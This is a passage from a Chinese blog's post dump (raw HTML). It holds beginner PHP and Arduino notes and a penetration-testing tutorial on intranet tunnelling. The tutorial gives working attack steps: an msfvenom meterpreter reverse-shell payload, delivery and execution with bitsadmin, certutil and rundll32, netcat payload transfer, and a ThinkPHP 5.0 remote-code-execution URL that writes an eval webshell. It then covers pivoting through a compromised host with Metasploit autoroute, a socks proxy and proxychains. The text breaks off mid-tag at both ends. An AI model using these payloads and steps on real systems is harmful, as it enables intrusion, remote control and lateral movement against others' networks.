class="hljs-keyword">for</span>=<span class="hljs-string">&quot;id:&quot;</span>&gt;&lt;/label&gt;<br>     &lt;input type=<span class="hljs-string">&quot;number&quot;</span> name=<span class="hljs-string">&quot;id&quot;</span>&gt;&lt;br&gt;<br>   <br>     &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;passwd:&quot;</span>&gt;&lt;/label&gt;<br>     &lt;input type=<span class="hljs-string">&quot;number&quot;</span> name=<span class="hljs-string">&quot;passwd&quot;</span>&gt;&lt;br&gt;<br>   <br>     &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br> &lt;/form&gt;<br> <span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用_GET方法获取，因为表单的提交方法是get</p><p>计算机：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!-- 计算器 --&gt;<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>    input num1:<br>    &lt;input type=<span class="hljs-string">&quot;number&quot;</span> name=<span class="hljs-string">&quot;num1&quot;</span>&gt;&lt;br&gt;<br><br>    input num1:<br>    &lt;input type=<span class="hljs-string">&quot;number&quot;</span> name=<span class="hljs-string">&quot;num2&quot;</span>&gt;&lt;br&gt;<br><br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;result is:&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num1&#x27;</span>]+<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num2&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li></ol><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="创建数组-amp-输出特定的元素"><a href="#创建数组-amp-输出特定的元素" class="headerlink" title="创建数组&amp;输出特定的元素"></a>创建数组&amp;输出特定的元素</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//第一种方式</span><br><span class="hljs-variable">$arr</span>=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3.4</span>,<span class="hljs-string">&quot;chg&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr</span>[<span class="hljs-number">3</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br><br><span class="hljs-comment">//第二种方式</span><br><span class="hljs-variable">$arr2</span>=<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-number">3.4</span>,<span class="hljs-string">&quot;zjy&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr2</span>;<br></code></pre></td></tr></table></figure><p>当直接输出数组的名称的时候，就会输出类型</p><h2 id="增加元素"><a href="#增加元素" class="headerlink" title="增加元素"></a>增加元素</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$arr</span>[]=<span class="hljs-string">&quot;zjy&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="使用数组接受"><a href="#使用数组接受" class="headerlink" title="使用数组接受"></a>使用数组接受</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;<br>    &lt;select  multiple=&quot;multiple&quot; name=&quot;fruits[]&quot;&gt;<br>        &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;<br>        &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;<br>        &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;<br>        &lt;option value=&quot;4&quot;&gt;4&lt;/option&gt;<br>    &lt;/select&gt;<br>    &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;<br>&lt;/form&gt;<br><br><br><br>&lt;?php<br>$fruits=$_GET[&#x27;fruits&#x27;];<br>print_r($fruits);<br>?&gt; <br></code></pre></td></tr></table></figure><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ol><li><p>语法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;filename&#x27;</span>;<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;filename&#x27;</span>;<br></code></pre></td></tr></table></figure></li></ol><h1 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test_class</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test1</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_test1</span>(<span class="hljs-params"><span class="hljs-variable">$test1_d</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test1=<span class="hljs-variable">$test1_d</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_test1</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;test1;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echo_test1</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test1;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-literal">TRUE</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;testTrue&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$class_object</span>=<span class="hljs-keyword">new</span> test_class;<br><br><span class="hljs-variable">$class_object</span>-&gt;<span class="hljs-title function_ invoke__">set_test1</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$class_object</span>-&gt;<span class="hljs-title function_ invoke__">get_test1</span>();<br><br><span class="hljs-variable">$class_object</span>-&gt;<span class="hljs-title function_ invoke__">echo_test1</span>();<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>解释语言，不需要编译<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arduino</title>
    <link href="/2023/10/08/%E5%B5%8C%E5%85%A5%E5%BC%8F/arduino/"/>
    <url>/2023/10/08/%E5%B5%8C%E5%85%A5%E5%BC%8F/arduino/</url>
    
    <content type="html"><![CDATA[<h1 id="arduino-i-x2F-o函数"><a href="#arduino-i-x2F-o函数" class="headerlink" title="arduino i&#x2F;o函数"></a>arduino i&#x2F;o函数</h1><ol><li><p>pinMode()函数</p><p>用于将特定的引脚设置为INPUT,OUTPUT,INPUT_PILLUP</p></li><li><p>digitaWrite()</p><p>设置引脚为HIGH,LOW</p></li><li><p>analogRead()</p><p>读取引脚的电压</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">analogRead</span>(pin)<br></code></pre></td></tr></table></figure></li></ol><h1 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h1><p>就是停止当前的主程序的工作，然后执行其他的工作完再来执行主程序</p><ol><li><p>注册中断</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">attachInterrupt</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> interruptNum, <span class="hljs-type">void</span> (*userFunc)(<span class="hljs-type">void</span>), <span class="hljs-type">int</span> mode)</span></span>;<br></code></pre></td></tr></table></figure><ul><li><p>interruptNum中断号，每一个开发板都会给可以中断的pin分配一个中断号</p></li><li><p>userFunc()</p><p>调用的函数</p></li><li><p>mode</p><p>触发条件</p><blockquote><p><strong>LOW</strong> 当中断所在 Pin 口处于低电平时触发<br><strong>CHANGE</strong> 当中断所在 Pin口电平改变时触发<br><strong>RISING</strong> 当中断所在Pin口从低电平变为高电平(上升沿)时触发<br><strong>FALLING</strong> 当中断所在Pin口从高电平变为低电平(下降沿)时触发</p></blockquote></li></ul></li><li><p>isr中不能使用其他的中断函数</p></li></ol><h1 id="串行"><a href="#串行" class="headerlink" title="串行"></a>串行</h1><p>一种通信的手段，可以用于不同设备的通信，也可以用于打印调试信息</p>]]></content>
    
    
    
    <tags>
      
      <tag>嵌入式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网隧道</title>
    <link href="/2023/10/07/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93/"/>
    <url>/2023/10/07/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93/</url>
    
    <content type="html"><![CDATA[<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><h2 id="windows下文件传输"><a href="#windows下文件传输" class="headerlink" title="windows下文件传输"></a>windows下文件传输</h2><h3 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h3><p>这个是用于win接受就可以不一定需要linux挂载</p><ol><li><p>我们可以通过这个命令将我们托管的payload下载下来</p></li><li><p>下面是我们的具体步骤</p><ul><li>攻击者使用linux的apache服务挂载我们的payload</li><li>然后使用下在win直接下载就行了</li></ul></li><li><p>演示</p><p>我已经将payload挂载到网络上，现在准备从win上载</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">bitsadmin /transfer shell http://ip/文件 本机目的地<br></code></pre></td></tr></table></figure><p>然后运行payload</p><p>我这里是使用的<code>.hta</code>文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">rundll32.exe url.dll,OpenURL .hta(目标文件)<br></code></pre></td></tr></table></figure><p>然后就会在msf接收到新的会话</p><p>为了防止msf命令忘记，下面复习一下常用的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">       msfconsole  进入msf<br>       msfvenom 审生成payload<br>       jobs  查看生成的监听器<br>       handler  创建监听器<br>       sessions -i session_id 进入到某个seesion<br>       <span class="hljs-keyword">exit</span> 退出监听，或者退出msf<br><br><span class="hljs-comment">### certutil</span><br><br>这个指令用于安装证书服务，也可以用于显示证书颁发机构的信息，备份和还原CA组件<br><br>下面就展示一下他的用法<br><br><span class="hljs-number">1</span>. 生成一个payload<br><br>   ```shell<br>       msfvenom -p windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp lhost=ip lport=port -f exe &gt; test.exe<br></code></pre></td></tr></table></figure></li><li><p>将payload移动到apache目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv test.exe /var/www/html<br></code></pre></td></tr></table></figure></li><li><p>使用certutil.exe下载</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">certutil.exe <span class="hljs-literal">-urlcache</span> <span class="hljs-operator">-split</span> <span class="hljs-operator">-f</span> http://ip/file myPath<br></code></pre></td></tr></table></figure></li><li><p>启动payload</p></li><li><p>清除缓存</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">certutil.exe -urlcache -<span class="hljs-built_in">split</span> -f <span class="hljs-keyword">http</span>://ip/<span class="hljs-built_in">file</span> myPath <span class="hljs-built_in">delete</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="linux和win的文件互传"><a href="#linux和win的文件互传" class="headerlink" title="linux和win的文件互传"></a>linux和win的文件互传</h3><h4 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h4><p>当用户的主机存在scp的话我们就可以使用这个</p><ol><li><p>安装scp</p><p>主要是可能不会在win安装这个程序，所以问哦们需要安装</p></li><li><p>使用</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment">#scp下载文件</span><br>scp user<span class="hljs-variable">@ip</span><span class="hljs-symbol">:file_path/file_name</span> myfilename<br><span class="hljs-comment">#下载文件夹</span><br>scp -r user<span class="hljs-variable">@ip</span><span class="hljs-symbol">:file_path/file_name</span> myfilename/<br><span class="hljs-comment">#scp上传文件</span><br>scp myfilename user<span class="hljs-variable">@ip</span><span class="hljs-symbol">:file_path/file_name</span><br><span class="hljs-comment">#scp下载文件夹</span><br>scp -r myfilename/ user<span class="hljs-variable">@ip</span><span class="hljs-symbol">:file_path/file_name</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="建立共享文件"><a href="#建立共享文件" class="headerlink" title="建立共享文件"></a>建立共享文件</h4><p>用于win之间传输文件</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use k: \\<span class="hljs-number">10.10.10.1</span>\c&amp;  /user:administrator <span class="hljs-string">&#x27;root&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="vbs脚本"><a href="#vbs脚本" class="headerlink" title="vbs脚本"></a>vbs脚本</h4><p>编写一个脚本文件用于下载文件</p><h2 id="linux下的文件传输"><a href="#linux下的文件传输" class="headerlink" title="linux下的文件传输"></a>linux下的文件传输</h2><h3 id="wget-下载"><a href="#wget-下载" class="headerlink" title="wget 下载"></a>wget 下载</h3><h3 id="curl下载"><a href="#curl下载" class="headerlink" title="curl下载"></a>curl下载</h3><p>就是一个服务工具</p><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>简单的讲是使用nc进行操作，nc也可以用于反弹shell</p><h4 id="被攻击者被动"><a href="#被攻击者被动" class="headerlink" title="被攻击者被动"></a>被攻击者被动</h4><ol><li><p>攻击者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat payload | nc -lvvp port <br></code></pre></td></tr></table></figure></li><li><p>被攻击者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc ip port &gt; payload<br></code></pre></td></tr></table></figure><p>这个过程比较的缓慢，需要等一下</p><p>而且好了也不会停止，需要暂停了才知道</p></li></ol><h4 id="被攻击者主动"><a href="#被攻击者主动" class="headerlink" title="被攻击者主动"></a>被攻击者主动</h4><ol><li><p>攻击者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc ip port &lt; payload<br></code></pre></td></tr></table></figure></li><li><p>被攻击者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvvp port &gt; payload<br></code></pre></td></tr></table></figure></li></ol><h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h3><p>这个使用运用了ssh协议</p><h3 id="dns传输数据"><a href="#dns传输数据" class="headerlink" title="dns传输数据"></a>dns传输数据</h3><h1 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h1><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理服务器就相当于一个转发信息的中间人</p><p>转发客户端和服务端的消息</p><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>当我们无法访问的的时候我们就需要使用正向代理，来跨过防火墙</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/image-20231020215251402.png" alt="image-20231020215251402"></p><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/image-20231020215341294.png" alt="image-20231020215341294"></p><p>可以理解为我们需要访问内网，但是现在只有反向代理服务器出网，所以我们使用这种方法来访问反向代理服务器，然后由反向代理服务器作为转发来连接服务内网服务器</p><p>这样来看我们可以可理解为反向代理服务器就是我们需要的资源服务器</p><p>现在使用最多的反向代理服务器是<a href="https://blog.csdn.net/hyfsbxg/article/details/122322125">NGINX</a></p><h3 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h3><p>而可以理解为，透明代理会帮助你筛选，如果你访问的是合理的就让你通过，如果不太合理，那么我们就不允许访问</p><blockquote><p>  客户端 A  和客户端 B  并不知道行为管理设备充当透明代理行为，当用户 A 或用户 B 向服务器 A  或服  务器 B  提交请求的时候，透明代理设备根据自身策略拦截并修改用户 A 或 B  的报文，并作为实际的请  求方，向服务器 A  或 B  发送请求，当接收信息回传，透明代理再根据自身的设置把允许的报文发回至  用户 A  或 B，如上图，如果透明代理设置不允许访问服务器 B，那么用户 A  或者用户 B  就不会得到服  务器 B 的数据。  </p></blockquote><h2 id="socks"><a href="#socks" class="headerlink" title="socks"></a>socks</h2><p>这个是一个协议，存在于应用层，可以理解为中间传递的方式。使用TCP&#x2F;IP协议，因而不提供如传递ICMP信息之类的网络层网关服务。</p><p>如今大型的网络架构，利用网络防火墙搭建起内部网络与外部网络的屏障，这些防火墙通常以应用层网关的形式工作在网络之间。</p><p><strong>而socks则通过框架来使这些协议安全透明地通过防火墙。</strong></p><p>但是socks代理当中我们不能代理ping原因是ping 是使用的是ICMP协议，socks是使用的是TCP&#x2F;IP协议</p><h2 id="socks代理-1"><a href="#socks代理-1" class="headerlink" title="socks代理"></a>socks代理</h2><ol><li><p>被代理端与代理服务器通过 SOCKS4&#x2F;5 代理协议进行通讯；  </p></li><li><p>SOCKS4：是对HTTP代理协议的加强，它不仅代理HTTP协议，而是对所有向外的连接进行代理，没有  协议限制；  </p></li><li><p>SOCKS4a：SOCKS4协议的简单扩展，允许客户端对无法解析域名的目的主机进行访问  </p></li><li><p>SOCKS5：SOCKS5比SOCKS4a多了身份验证、IPv6、UDP支持。创建与SOCKS5服务器的TCP连接后  客户端需要先发送请求来确认协议版本及认证方式，相对前面的版本这个版本当中支持的协议更多，相对前面更加的安全</p></li></ol><h3 id="socks代理和vpn的区别"><a href="#socks代理和vpn的区别" class="headerlink" title="socks代理和vpn的区别"></a>socks代理和vpn的区别</h3><h4 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h4><p>vpn（Virtual Private Network，虚拟专用网络），可以通过公共网络</p><p>（互联网）建立起加密，私密的连接技术</p><p>主要是用于当处于外网的时候使用vpn访问公司内部的资料</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/image-20231020222033527.png" alt="image-20231020222033527"></p><h3 id="socks5代理工具"><a href="#socks5代理工具" class="headerlink" title="socks5代理工具"></a>socks5代理工具</h3><ol><li>frp</li><li>ProxyChains</li></ol><h2 id="socks代理实战一（MSF）"><a href="#socks代理实战一（MSF）" class="headerlink" title="socks代理实战一（MSF）"></a>socks代理实战一（MSF）</h2><h4 id="如何通过TTL判断是什么系统】"><a href="#如何通过TTL判断是什么系统】" class="headerlink" title="如何通过TTL判断是什么系统】"></a>如何通过TTL判断是什么系统】</h4><ul><li>win  128 255</li><li>linux 64 255</li><li>macos 64 128</li></ul><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>拿到了对方的IP我们可以做以下的信息收集</p><h5 id="namp端收集"><a href="#namp端收集" class="headerlink" title="namp端收集"></a>namp端收集</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -A -T4  -p- --script vuln ip<br></code></pre></td></tr></table></figure><blockquote><p>-A    -p-  启动扫描所有的端口</p><p>-T4  速度（0-&gt;5） 慢到</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/image-20231021111332601.png" alt="image-20231021111332601"></p><p>根据结果我们可以使用nmap的扫描出来的结果针对不同的服务指定不同的攻击计划</p><h5 id="针对21-x2F-22采用弱口令爆破"><a href="#针对21-x2F-22采用弱口令爆破" class="headerlink" title="针对21&#x2F;22采用弱口令爆破"></a>针对21&#x2F;22采用弱口令爆破</h5><h5 id="根据网站路径渗透"><a href="#根据网站路径渗透" class="headerlink" title="根据网站路径渗透"></a>根据网站路径渗透</h5><p>我们可以尝试使用不同的URL地址来测试是否可以登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">dirb http://192.168.134.137<br><br></code></pre></td></tr></table></figure><p>扫描url路径</p><h5 id="路径利用"><a href="#路径利用" class="headerlink" title="路径利用"></a>路径利用</h5><p>使用扫描出来的路径判断有哪些是可以使用的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/image-20231021112709622.png" alt="image-20231021112709622"></p><p>爆破出来一个</p><h5 id="根据框架利用漏洞"><a href="#根据框架利用漏洞" class="headerlink" title="根据框架利用漏洞"></a>根据框架利用漏洞</h5><blockquote><p>  Thinkphp v5.0 存在远程命令执行漏洞，通过命令执行写入一句话，可GetShell  </p></blockquote><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpin<br>fo<span class="hljs-variable">&amp;vars</span>[1][]=1<br><br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=syste<br>m<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br><br><br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=file_put_contents<span class="hljs-variable">&amp;vars</span>[1][]=shell.php<span class="hljs-variable">&amp;vars</span>[1][]=&lt;?php @eval($_POST[c]);?&gt;<br><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/image-20231021113101731.png" alt="image-20231021113101731"></p><p>我们测试我们上传的一句话木马</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/image-20231021113536611.png" alt="image-20231021113536611"></p><p>使用连接工具连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/image-20231021113835911.png" alt="image-20231021113835911"></p><p>记得路径</p><p>但是这只是一个跳板机边缘</p><h5 id="拿到跳板机后"><a href="#拿到跳板机后" class="headerlink" title="拿到跳板机后"></a>拿到跳板机后</h5><h6 id="查看网段"><a href="#查看网段" class="headerlink" title="查看网段"></a>查看网段</h6><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/image-20231021114452073.png" alt="image-20231021114452073"></p><p>我们可以根据此网段发现其他的存活主机，就会遇到一个问题怎么获取其他存活的ip</p><p>但是有该主机上面不存在渗透工具，所以出现了socks代理</p><h4 id="msf连接跳板机搭建socks代理"><a href="#msf连接跳板机搭建socks代理" class="headerlink" title="msf连接跳板机搭建socks代理"></a>msf连接跳板机搭建socks代理</h4><ul><li><p>使用msf连接到会话（不展示）</p></li><li><p>使用run开启后渗透模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">run autoroute -s 网段<br>run autoroute -h 使用帮助<br></code></pre></td></tr></table></figure></li><li><p>退回msf</p></li><li><p>使用代理模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">use auxiliary/server/socks_proxy<br>options 查看对应的逻辑<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/image-20231022002940628.png" alt="image-20231022002940628"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">run 启动这个模块<br>jobs 查看当前的运行的服务<br></code></pre></td></tr></table></figure><p>可以查看端口是否开启</p></li><li><p>配置代理攻击</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo vim /etc/proxychains4.conf  <br></code></pre></td></tr></table></figure><p><img 